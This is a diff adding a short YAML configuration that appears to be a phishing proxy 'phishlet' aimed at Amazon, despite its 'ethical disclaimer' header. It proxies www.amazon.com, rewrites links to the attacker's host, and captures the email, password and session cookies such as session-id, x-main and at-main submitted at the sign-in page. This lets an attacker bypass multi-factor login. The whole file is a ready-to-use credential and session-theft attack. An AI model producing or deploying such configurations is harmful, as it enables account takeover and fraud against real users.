@@ -1,0 +1,21 @@
+# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'https://www.amazon.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
+auth_tokens:
+  - domain: '.amazon.com'
+    keys: ['session-id', 'session-id-time', 'ubid-main', 'x-main', 'at-main', 'sess-at-main']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.amazon.com'
+  path: '/ap/signin'
